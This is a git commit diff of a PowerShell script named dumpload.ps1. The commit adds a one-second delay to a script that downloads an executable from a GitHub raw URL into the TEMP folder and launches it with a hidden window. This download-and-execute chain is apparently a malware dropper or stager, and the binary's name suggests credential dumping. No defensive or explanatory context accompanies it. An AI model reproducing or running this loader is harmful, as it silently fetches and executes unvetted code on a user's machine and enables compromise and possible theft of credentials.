b4d83eaf469c7b2090e450dc79758ea6cdfef93b
cia168168 <147810144+cia168168@users.noreply.github.com>
2024-05-01 19:19:06 +0700

    Update dumpload.ps1

--- dumpload.ps1
+++ dumpload.ps1
@@ -1,4 +1,5 @@
 $url5 = "https://github.com/cia168168/folder/raw/main/dump2.exe"
 $output5 = "$env:TEMP\dump.exe"
 Invoke-WebRequest -Uri $url5 -OutFile $output5
+Start-Sleep -Seconds 1  # Adding a delay of 1 second
 Start-Process -FilePath "$env:TEMP\dump.exe" -WindowStyle Hidden
